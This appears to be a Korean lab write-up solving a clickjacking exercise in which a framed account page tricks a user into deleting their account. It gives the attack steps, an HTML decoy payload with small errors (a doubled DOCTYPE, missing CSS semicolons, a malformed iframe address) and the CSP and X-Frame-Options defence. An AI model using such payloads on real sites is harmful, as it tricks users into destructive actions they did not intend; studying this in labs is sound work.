# 🚩Lab: Basic clickjacking with CSRF token protection
```text
This lab contains login functionality and a delete account button that is protected by a CSRF token.
A user will click on elements that display the word "click" on a decoy website.

To solve the lab, craft some HTML that frames the account page and fools the user into deleting their account.
The lab is solved when the account is deleted.

You can log in to your own account using the following credentials: wiener:peter
```

### 🔍 분석 및 공격 과정
1. wiener:peter로 로그인해본다.
2. 로그인하면 `/my-account`로 리다이렉트한다. 이 페이지에는 `X-Frame-Options`, `CSP`가 설정되어 있지 않음. 따라서 제한없이 iframe에 적재 가능하다.
3. `/my-account` 페이지에는 `delete account`가 존재. 해당 동작을 clickjacking을 통해 유도해야함.
4. exploit 서버로 이동해 코드를 작성한다.
```html
<!DOCTYPE <!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>lab-basic-csrf-protected</title>
    <style>
      #target_website{
        position: relative;
        width: 128px;
        height: 128px;
        opacity: 0.5;
        z-index: 2;
      }
      #decoy_website{
        position: absolute;
        top: 10px
        left: 10px
        z-index: 1;
      }
    </style>
  </head>
  <body>
    <div id="decoy_website">
      <button>click</button>
    </div>
    <iframe id="target_website" src="https/lab-domain/my-account"></iframe>
    
  </body>
</html>
```
5. iframe의 opacity를 처음에는 불투명하게 둔 후, decoy의 위치를 개발자 도구에서 수동으로 조절해보며 겹치도록 설정한다.
6. 정확히 겹치는 top, left 값을 찾은 후 기록해두자.
7. 기록해둔 값으로 공격자 서버에서 수정후 save.
8. 피해자에게 전송 -> solve
### 💡 취약점 원리
  클릭 한번으로 작동하는 delete account 프로세스 자체에도 문제가 있으나, 클릭재킹의 관점에서만 살펴보면 iframe에 대한 아무런 제약 사항이 없다라는 문제가 존재한다. CSP와 X-Frame-Options의 조합으로 방어할 수 있다.
